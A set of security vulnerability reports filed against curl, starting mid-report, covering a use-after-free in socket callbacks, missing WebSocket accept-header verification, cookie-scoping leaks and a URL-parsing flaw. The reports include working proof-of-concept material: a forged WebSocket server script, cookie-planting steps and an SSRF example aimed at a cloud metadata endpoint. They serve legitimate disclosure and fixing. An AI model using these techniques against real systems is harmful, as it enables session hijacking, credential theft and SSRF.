touching it again, and adds a debug `magic` field specifically to help catch
this class of bug.

The sibling function mev_forget_socket(), in the same file, has the
identical hazard and was not touched by this patch:

    static CURLMcode mev_forget_socket(struct Curl_multi *multi,
                                       struct Curl_easy *data,
                                       curl_socket_t s,
                                       const char *cause)
    {
      struct mev_sh_entry *entry = mev_sh_entry_get(&multi->ev.sh_entries, s);
      int rc = 0;

      if(!entry) return CURLM_OK;

      if(entry->announced && multi->socket_cb) {
        mev_in_callback(multi, TRUE);
        rc = multi->socket_cb(data, s, CURL_POLL_REMOVE,
                              multi->socket_userp, entry->user_data);
        mev_in_callback(multi, FALSE);
        entry->announced = FALSE;   /* <-- UAF: entry may already be freed */
      }

      mev_sh_entry_kill(multi, s);
      ...
    }

If the application's socket callback, invoked at the CURL_POLL_REMOVE
notification, calls curl_easy_pause() on any transfer sharing the same
socket (realistic with HTTP/2 multiplexing, where multiple transfers share
one connection/socket), that reentrant call can free `entry` via
mev_sh_entry_kill() before control returns to the outer frame. The
subsequent `entry->announced = FALSE;` is a heap-use-after-free WRITE.
=====================================================================
STEPS TO REPRODUCE / PROOF OF CONCEPT
=====================================================================

Two independent proofs of concept are provided.

Method 1: whitebox harness (deterministic, targets the exact write)

The actual, unmodified lib/multi_ev.c (not a reimplementation) was compiled
as part of a real ASan-instrumented libcurl build:

  CFLAGS='-fsanitize=address -fno-omit-frame-pointer -g -O0' \
  LDFLAGS='-fsanitize=address' \
  ./configure --disable-shared --enable-debug --without-ssl
  make -C lib

A small harness (attached: curl_uaf_harness.c) #includes the real
multi_ev.c and calls the real exported Curl_multi_ev_socket_done() (the
thin public wrapper around mev_forget_socket()), with a socket_cb that
deletes the socket's hash entry from inside the callback, reproducing what
a reentrant curl_easy_pause() call does:

  gcc -DHAVE_CONFIG_H -I../include -I../lib -I. -DDEBUGBUILD -DCURLDEBUG \
      -DBUILDING_LIBCURL -D_GNU_SOURCE -fsanitize=address \
      -fno-omit-frame-pointer -g -O0 -c curl_uaf_harness.c -o curl_uaf_harness.o
  gcc -fsanitize=address -g -o curl_uaf_poc curl_uaf_harness.o .libs/libcurl.a \
      -lnghttp2 -lidn2 -lrtmp -lldap -llber -lpsl -lzstd -lbrotlidec -lz -lpthread
  ./curl_uaf_poc

AddressSanitizer reports a heap-use-after-free WRITE of size 1 at
multi_ev.c:213 (entry->announced = FALSE;), with the free happening at
multi_ev.c:133 (mev_sh_entry_kill) inside the callback invoked from
mev_forget_socket at multi_ev.c:210 — exactly the predicted reentrancy
window. Full ASan output attached (poc_output.txt).

Scope note: this harness triggers the reentrant free directly inside the
socket callback rather than through a live two-easy-handle HTTP/2 connection
with a genuine curl_easy_pause() call racing real socket I/O. It targets the
exact vulnerable write with real, unmodified function bodies, the real
exported entry point, and the real heap allocator via an actual ASan-built
libcurl.

Method 2: live, organic reproduction (real network I/O, no internal headers)

live_h2_client.c (attached) uses only curl's public API to drive two easy
handles through a real curl_multi_socket_action() event loop against a real
local nginx HTTP/2 (cleartext, prior-knowledge) server, injecting
curl_easy_pause() calls on both handles from inside CURLMOPT_SOCKETFUNCTION
whenever the shared socket is removed — the same reentrancy pattern
CVE-2026-9080 addressed in mev_sh_entry_update().

This reproduces deterministically (5/5 runs): handle A's IPv6 connect
attempt is refused (nginx listens IPv4-only), and while curl tears down
that failed connection's socket, the injected curl_easy_pause() calls
reentrantly corrupt multi_ev.c's bookkeeping, tripping DEBUGASSERT(NULL) in
mev_pollset_diff() at multi_ev.c:420 ("transfer lost interest but is not
registered"). This is a different specific invariant than the Method 1
write at line 213, but the same root cause (curl_easy_pause() reentrancy
from inside the socket callback). In a non-DEBUGBUILD (production) binary
this particular assertion is a no-op, so this exact manifestation's
real-world consequence there is silently-inconsistent internal state rather
than a guaranteed abort — Method 1's line-213 write remains the clearer
evidence of a consequence that matters in production (non-debug) builds.
Full log attached (live_repro_output.txt), along with a screen recording of
a live run for easier triage (live_h2_repro.mp4; the source asciinema
terminal recording, live_h2_repro.cast, is also included).

## Impact

A heap-use-after-free write in a library embedded in an enormous number of
network-facing daemons, tools, and language bindings. Concretely
demonstrated impact is a deterministic crash (SIGABRT under ASan); without
instrumentation, the practical effect depends on what the allocator has
placed in the freed slot by the time the write occurs, which was not
established beyond "reasoned as potentially exploitable, not verified against
a specific target". Reachable by any application using curl's multi-socket
interface (CURLMOPT_SOCKETFUNCTION) that calls curl_easy_pause() from its
socket callback while multiple transfers share a socket — most realistically
via HTTP/2 multiplexing. A remote server has some influence over the timing
of connection-teardown/pause-worthy events that lead into this code path.

3917775.title: curl Missing Sec-WebSocket-Accept Verification Enables MITM WebSocket Session Hijacking

profile.name: curl
profile.about: cURL is an Open Source project providing a library and command-line tool doing internet transfers

3917775.vulnerability_information:
## Summary

curl's `Curl_ws_accept()` function in `lib/ws.c` processes the 101 Switching Protocols response to a client WebSocket upgrade request. RFC 6455 Section 4.1 mandates that the client MUST verify the `Sec-WebSocket-Accept` response header by computing the SHA-1 hash of the concatenation of the `Sec-WebSocket-Key` value with the magic GUID `258EAFA5-E914-47DA-95CA-C5AB0DC85B11`, base64-encoding the result, and comparing it against the server-returned value. The source code contains a comment describing this requirement (line 1418) but implements no actual verification logic — there is no SHA-1 computation, no header comparison, and no rejection path. The function unconditionally calls `infof(data, "[WS] Received 101, switch to WebSocket")` and switches to WebSocket mode upon receiving any `HTTP/1.1 101 Switching Protocols` response. A network attacker positioned on the `ws://` connection path can return a forged 101 response that entirely omits the `Sec-WebSocket-Accept` header (or includes an arbitrary incorrect value), and curl will accept it and process attacker-controlled WebSocket frames. This enables full man-in-the-middle hijacking of any `ws://` WebSocket transfer.

```python
#!/usr/bin/env python3
"""PoC: send 101 without Sec-WebSocket-Accept — curl accepts it."""
import socket, struct, sys, time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8766
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT)); s.listen(1)
conn, _ = s.accept()
data = b""
while b"\r\n\r\n" not in data:
    data += conn.recv(4096)
# Send 101 WITHOUT Sec-WebSocket-Accept header
conn.sendall(b"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n")
time.sleep(0.5)
# Send attacker-controlled WebSocket binary frame
frame = bytes([0x82, 25]) + b"ATTACKER_CONTROLLED_DATA"
conn.sendall(frame)
time.sleep(2)
conn.close(); s.close()
```

Run: `python3 poc.py 8766` then in another terminal: `curl -v ws://127.0.0.1:8766/`

## Affected version

curl 8.22.0-DEV (compiled from master, 2026-08-05)

Platform: Ubuntu 24.04 (x86_64), Debug build with ASan

Source location: `lib/ws.c`, function `Curl_ws_accept()`, lines 1375–1510

The vulnerability has been present since the initial introduction of WebSocket support. No code changes were observed in the current master branch.

## Steps To Reproduce

1. Save the PoC script above as `poc.py`.
2. Start the fake WebSocket server: `python3 poc.py 8766`
3. Run curl: `curl --max-time 5 -v ws://127.0.0.1:8766/`
4. Observe curl output:
   - `< HTTP/1.1 101 Switching Protocols`
   - `* Received 101, Switching to WebSocket`
   - `[WS] Received 101, switch to WebSocket`
5. curl accepts the 101 response without a `Sec-WebSocket-Accept` header, switches to WebSocket mode, and processes the attacker-sent frame. No rejection or error occurs.

Expected compliant behavior: curl MUST compute `base64(SHA1(Sec-WebSocket-Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))` and verify it matches the `Sec-WebSocket-Accept` value returned by the server. If the header is missing or the value does not match, curl MUST fail the WebSocket connection (RFC 6455 Section 4.1, item 6).


## Again: there is no bug-bounty for curl. We do not offer any rewards, only proper credits.

## Impact

## Summary

An attacker positioned on the network path of a `ws://` WebSocket connection can hijack the WebSocket session by returning a forged 101 Switching Protocols response. Because `Curl_ws_accept()` performs zero verification of the `Sec-WebSocket-Accept` header, the attacker-controlled 101 response is accepted unconditionally.

Once the forged WebSocket session is established, the attacker gains full control:

- **Inject arbitrary WebSocket frames** — The attacker can send arbitrary binary or text frames to the curl client, impersonating the legitimate server. Application logic consuming WebSocket data cannot distinguish genuine server data from attacker-injected data.
- **Intercept client traffic** — Any WebSocket frames the client sends through the hijacked session are visible to the attacker, compromising the confidentiality and integrity of the connection.
- **Bypass application-layer authentication** — Application-level authentication or message integrity checks built on top of the `ws://` WebSocket transport may be undermined, since the attacker controls the entire data channel.

This vulnerability affects all users who use curl's WebSocket support with `ws://` URLs. Connections using `wss://` (WebSocket over TLS) are not affected, as the TLS layer prevents a man-in-the-middle from tampering with the 101 response.

3920276.title: Cookie jar load skips public suffix check on PSL builds

profile.name: curl
profile.about: cURL is an Open Source project providing a library and command-line tool doing internet transfers

3920276.vulnerability_information:
On curl 8.21.0 with libpsl (official curl.se 8.21.0_6 win64, Features: PSL), HTTP Set-Cookie: Domain=co.uk is dropped in verbose. The same cookie loaded from a Netscape jar file or a Set-Cookie: line in that file is accepted and later sent to unrelated hosts under the suffix (bank.co.uk, other.co.uk).

Root cause: is_public_suffix() in lib/cookie.c only calls libpsl when the setting-host domain argument is non-NULL (line 815). cookie_load() passes NULL at line 1179. CURLOPT_COOKIELIST uses the same path. docs/cmdline-opts/cookie.md says PSL builds discard suffix-domain cookies on --cookie file load; that check is missing here.

Version: curl 8.21.0 (x86_64-w64-mingw32), libcurl/8.21.0, libpsl/0.23.0, Windows 11.

Control (HTTP - works):
1. Server returns Set-Cookie: trk=http; Domain=co.uk; Path=/
2. curl -v -c jar -b jar --resolve evil.co.uk:9999:127.0.0.1 http://evil.co.uk:9999/
3. Verbose: must not set cookies for 'co.uk'. Request to bank.co.uk with -b jar sends no Cookie: header.

Bug (jar - broken):
1. cookies.txt (tab-separated Netscape format):
# Netscape HTTP Cookie File
.co.uk	TRUE	/	FALSE	0	trk	planted
2. curl -v -b cookies.txt --resolve bank.co.uk:9998:127.0.0.1 http://bank.co.uk:9998/
3. Request includes Cookie: trk=planted. Same jar also sends to other.co.uk.

Also reproduces with Set-Cookie: trk=viafile; Domain=co.uk; Path=/ as the only line in the file. PoC attached runs control + bug twice on localhost.

(AI for report polishing)

## Impact

If untrusted data can be merged into a cookie jar (shared file, -b -, CURLOPT_COOKIELIST, app importing a foreign cookie export), an attacker can plant a supercookie for a public suffix (co.uk, github.io, etc.). curl then attaches it on requests to unrelated sites under that suffix. Same impact class as prior PSL supercookie fixes on live Set-Cookie, but the gap is jar/COOKIELIST import where domain is NULL and the PSL gate is skipped.

3923212.title: URL API: triple-slash parses path segment as hostname

profile.name: curl
profile.about: cURL is an Open Source project providing a library and command-line tool doing internet transfers

3923212.vulnerability_information:
## Summary

libcurl's URL API misparses http:///host/path. Per RFC 3986, the authority 
between // and / is empty, so /host/path is the path. But parseurl() in 
lib/urlapi.c treats the first segment as the hostname. On line ~1087, the 
slash counter i reaches 3, which is within the valid 1-3 range, and hostp 
is set to whatever follows the third slash. The file:// scheme has special 
handling that correctly handles empty authority — this fix should be 
generalized to other schemes.

## Affected version
libcurl 8.5.0 (Ubuntu 24.04) and 8.21.0 (latest). Confirmed on both.
curl 8.5.0 (x86_64-pc-linux-gnu) libcurl/8.5.0 OpenSSL/3.0.13

## Steps To Reproduce
1. Compile and run the attached poc_tripleslash.c
2. Observe: http:///169.254.169.254/latest/meta-data/
   → host="169.254.169.254", path="/latest/meta-data/"
   Expected: host="" (empty authority), path="/169.254.169.254/latest/meta-data/"
3. Also confirmed via curl CLI: `curl -w "%{url_effective}" http:///path`
   Outputs: http://path/ (path became hostname)

## Impact

An application that constructs URLs from user input and validates the 
parsed hostname via curl_url_get(CURLUPART_HOST) can be tricked into 
making requests to attacker-chosen hosts. For example, if user input 
"/169.254.169.254/latest/meta-data/" is appended to "http://", curl 
parses host="169.254.169.254", enabling SSRF to cloud metadata endpoints.

3952619.title: Domainless COOKIEFILE cookie leaks to unrelated IP-literal hosts

profile.name: curl
profile.about: cURL is an Open Source project providing a library and command-line tool doing internet transfers

3952619.vulnerability_information:
When curl loads a cookie file written as raw HTTP `Set-Cookie:` header lines and a line has no `Domain` attribute, the cookie is stored with `co->domain == NULL`, because a file import has no request-host to scope it to. On the send side, `Curl_cookie_getlist` accepts any cookie in the bucket whose domain is NULL before it ever compares the request host (the `!co->domain ||` short-circuit at `lib/cookie.c:1340`) and `cookiehash()` places both NULL-domain cookies and numeric-IP hosts in the same bucket 0 (`lib/cookie.c:216`). The result is that a domainless cookie from a file gets attached to requests for unrelated IP-literal hosts. An attacker who can steer the client into following a redirect to an IP literal can harvest whatever credential that cookie carries.

## Steps to reproduce (tested with curl 8.7.1 on macOS)

**Start a listener on port 8888.** 
```
printf 'HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n' | nc -l 8888
```
(On Linux / GNU netcat, the port is passed as `nc -l -p 8888` instead.)

**Step 1:** write a cookie file in HTTP `Set-Cookie:` header format, with **no** `Domain` attribute:

```
printf 'Set-Cookie: SBF_SECRET=secret; Path=/\r\n' > c.txt
```

**Step 2:** load that file and make a request to an IP-literal host:

```
curl -v -b c.txt http://127.0.0.1:8888/
```

curl's verbose output shows `> Cookie: SBF_SECRET=secret`. The domainless cookie was sent to `127.0.0.1`, even though the `CURLOPT_COOKIEFILE.md` docs say it must not be.

**Negative control (optional):** repeat step 2 against a DNS name that resolves to the same IP, and the cookie is *not* sent, which isolates the leak to the IP-literal path:

```
curl -v -b c.txt --resolve example.test:8888:127.0.0.1 http://example.test:8888/
```

## Impact

This is a cross-origin leak of a host-scoped credential. Cookies loaded via COOKIEFILE frequently carry session IDs, API tokens, or other secrets. This bug attaches such a cookie to a request for an unrelated host, contradicting curl's documented COOKIEFILE behavior and RFC 6265 §5.3/§5.4 cookie scoping.

The victim runs curl with such a cookie jar and `-L`, and an endpoint the attacker controls or influences (an open redirect on a trusted site, or any followed hop) points curl at `http://<attacker-ip>/`. The domainless cookie is then sent to that attacker-controlled IP in a plaintext `Cookie:` header and the attacker can replays whatever it protects (session ID, API token, CSRF secret) to act as the victim.

3963330.title: libcurl Digest/NTLM authentication ignores an explicit Authorization header

profile.name: curl
profile.about: cURL is an Open Source project providing a library and command-line tool doing internet transfers

3963330.vulnerability_information:
## Summary

When an application sets an explicit `Authorization` header via `CURLOPT_HTTPHEADER` while libcurl also has credentials configured and HTTP Digest or NTLM authentication is selected/challenged, libcurl does not honor the application's header as a replacement — it sends its own internally generated Digest/NTLM credential in addition to the application's header. Basic, Bearer, Negotiate and AWS_SIGV4 were tested as controls and correctly suppress libcurl's own header in this situation; Digest and NTLM do not. This is reproducible on released libcurl 8.21.0 and on current HEAD (5c61e16869 / 8.22.0-DEV). The security consequence: against a test backend enforcing real per-tenant access control, a request carrying only a low-privilege tenant Bearer token retrieved another tenant's protected data, because the backend's ordinary Authorization-header parsing picked up libcurl's unwanted, more-privileged Digest credential instead of the application's own. `CURLOPT_HTTPHEADER`'s documentation states that an application-supplied header "otherwise generated and used by libcurl internally" is used instead of libcurl's own, with no documented exception for Digest/NTLM. AI assistance (Claude) was used for source analysis, experiment design, and drafting this report; all technical claims and reproduction steps below were independently run and verified by the researcher.

## Affected Version

- curl/libcurl 8.21.0 (release tag `curl-8_21_0`)
- Also reproduced on current HEAD, commit `5c61e16869` (`8.22.0-DEV`)
- Build used for reproduction: local build from source, OpenSSL backend, `-DCURL_ENABLE_NTLM=ON` (NTLM is not enabled by default in a cmake build and had to be turned on explicitly to test it)
- `curl -V` output from the two builds used:
  - `curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.5.5 zlib/1.3.1`
  - `curl 8.22.0-DEV (Linux) libcurl/8.22.0-DEV OpenSSL/3.5.5 zlib/1.3.1`

## Steps to Reproduce

1. Build curl from the `curl-8_21_0` tag (or use HEAD) with OpenSSL and NTLM enabled.
2. Write a minimal libcurl client that sets `CURLOPT_USERPWD` to a privileged test credential (`svc_account:PRIVILEGED_INFRA_SECRET`).
3. On the same handle, set `CURLOPT_HTTPHEADER` with an explicit `Authorization: Bearer LOW_PRIV_TENANT_B_TOKEN` header.
4. Set `CURLOPT_HTTPAUTH` to `CURLAUTH_DIGEST`.
5. Point the client at a test server that answers the first request with `401` + `WWW-Authenticate: Digest realm="...", nonce="...", qop="auth", algorithm=MD5`.
6. Capture the second (retried) request on the wire.
7. Confirm it contains two `Authorization` header lines:
   ```
   Authorization: Digest username="svc_account", realm="...", nonce="...", uri="...",
     cnonce="...", nc=00000001, qop=auth, response="...", algorithm=MD5
   Authorization: Bearer LOW_PRIV_TENANT_B_TOKEN
   ```
8. Have the server resolve identity using ordinary `Authorization` header access (Python's `http.server`/`email.message.get()`, which returns the first occurrence, was used in our test) and confirm it resolves to `svc-account`, not `tenant-b`.
9. Confirm the server, enforcing a real ACL (`tenant-b` → `/tenants/b/data` only, `svc-account` → all resources), returns the protected resource for a request that should have been scoped to `tenant-b`.
10. Repeat with `CURLOPT_USERPWD` removed (only the Bearer token set). Confirm the same server correctly denies the Digest challenge and no protected data is returned.

This was implemented as a standalone libcurl C reproducer (`repro.c`, parameterized by URL/scheme/credential/custom header) driving a local Python test server (`authz_server.py`) that performs the ACL check in step 9. Both are available on request.

## Vulnerable Source

- `lib/http.c`, function `output_auth_headers()`:
  - NTLM branch (`if(authstatus->picked == CURLAUTH_NTLM)`, ~line 707) — calls `Curl_output_ntlm()` unconditionally.
  - Digest branch (`if(authstatus->picked == CURLAUTH_DIGEST)`, ~line 716) — calls `Curl_output_digest()` unconditionally.
- `lib/http_ntlm.c`, `Curl_output_ntlm()` (~line 116) — no header-suppression check.
- `lib/http_digest.c`, `Curl_output_digest()` (~line 84) — no header-suppression check.

By contrast, the Basic branch (~line 727) and Bearer branch (~line 751) in the same `output_auth_headers()` function both gate their own header generation on `!Curl_checkheaders(data, STRCONST("Authorization"))` (and `!Curl_checkProxyheaders(...)` for the proxy case) and set `authstatus->done = TRUE` instead of adding their own header when the application has already supplied one. The Negotiate branch (~line 688) has the same guard as of a recent fix. Digest and NTLM are the two remaining branches in this function without that check anywhere in their call chain.

## Impact

### Confirmed impact

Using a test backend that enforces an actual per-tenant ACL (not a label), a request built entirely by the application to carry only a low-privilege, tenant-scoped Bearer token retrieved a different tenant's protected resource. This happened because libcurl also emitted its own Digest credential (derived from a privileged credential configured on the same handle), and the backend's ordinary `Authorization` header handling resolved the request's identity from that credential instead of the application's own. Removing the privileged credential from the client configuration (keeping only the Bearer token) reproduces the correct, secure outcome on the same server: the Digest challenge cannot be answered and no protected data is returned. This isolates the cause to the specific vulnerable configuration (a handle carrying both a privileged fallback credential and a per-call override header), not to any flaw in the ACL logic itself.

### Conditional impact

In a separate, explicitly isolated experiment, `CURLOPT_RESOLVE` was used to point the application's trusted hostname at a different endpoint while curl still treated it as the same origin. In that setup, libcurl's own Digest credential was delivered to that endpoint. This was **not** tested with a live DNS rebinding or DNS cache-poisoning attack — `CURLOPT_RESOLVE` was used only to isolate what happens once a hostname resolves elsewhere, not to demonstrate how an attacker would cause that resolution change in practice. This is reported as a conditional, secondary consideration, not as the primary vulnerability or a proven attack chain.

### Limitations

- This is not a generic authentication bypass: no external party forges or steals a credential; the confusion arises from libcurl emitting a credential the application already possessed and explicitly tried to withhold from this specific request.
- Not proven to affect every HTTP server or backend. Duplicate-`Authorization`-header handling was checked against several implementations; Python `http.server`, Node.js, Go `net/http`, Flask/Werkzeug and Apache all produced behavior (first-value or merged-value parsing) that could select the unwanted Digest credential, while nginx rejected the malformed duplicate-header request outright. This varies by server/backend and is not claimed to be universal.
- Not demonstrated as request smuggling or response desynchronization. No proxy/backend differential exploit was built or shown.
- Cross-origin credential handling was tested directly and works correctly: on a redirect to a different origin, libcurl does not send the credential to the new host. We are not claiming arbitrary cross-origin credential leakage.

## Weakness

**Incorrect Authorization (CWE-863)** — the demonstrated impact is that the receiving side authenticates and authorizes the request under the wrong identity because libcurl silently attaches a credential the application had explicitly tried to keep off the request. This is closer to "the wrong authorization decision gets made" than to a raw credential leak, so CWE-863 fits better than a generic information-exposure weakness. If the program prefers a different single weakness (e.g. Improper Authentication / CWE-287), we'd defer to their taxonomy, but CWE-863 is our primary recommendation.

## Severity

**Medium.**

Justification, based only on demonstrated (not conditional) impact: this does cause a real cross-tenant authorization violation against a backend enforcing a legitimate ACL, which is more than a cosmetic or protocol-compliance issue. But it requires a specific, non-default application configuration (a handle carrying both a privileged fallback credential and a per-call override header, with Digest or NTLM actually selected/challenged) rather than being exploitable against an arbitrary curl user or default configuration. It does not cross curl's origin boundary — that protection was tested directly and holds. It does not by itself compromise a server that doesn't already have this kind of split-credential configuration. Given the real but conditioned nature of the impact, we believe Medium is the accurate rating; we are not asserting High/Critical, and we are not inflating this simply because the demonstration involved privileged test credentials.

## Remediation

Add the same suppression check already used by Basic/Bearer/Negotiate to the Digest and NTLM branches of `output_auth_headers()` in `lib/http.c`: before calling `Curl_output_digest()` / `Curl_output_ntlm()`, check `!Curl_checkheaders(data, STRCONST("Authorization"))` (and `!Curl_checkProxyheaders(...)` for the proxy path), and set `authstatus->done = TRUE` instead of adding libcurl's own header when the application has already supplied one — mirroring the existing Basic/Bearer/Negotiate branches in the same function. A regression test should cover: application sets `CURLOPT_HTTPHEADER` with an explicit `Authorization:` header, credentials are configured via `CURLOPT_USERPWD`, `CURLOPT_HTTPAUTH` includes `CURLAUTH_DIGEST` (and separately `CURLAUTH_NTLM`), server challenges with the corresponding `WWW-Authenticate`, and the test asserts the retried request contains exactly one `Authorization` header, equal to the application-supplied value.

profile.name: curl
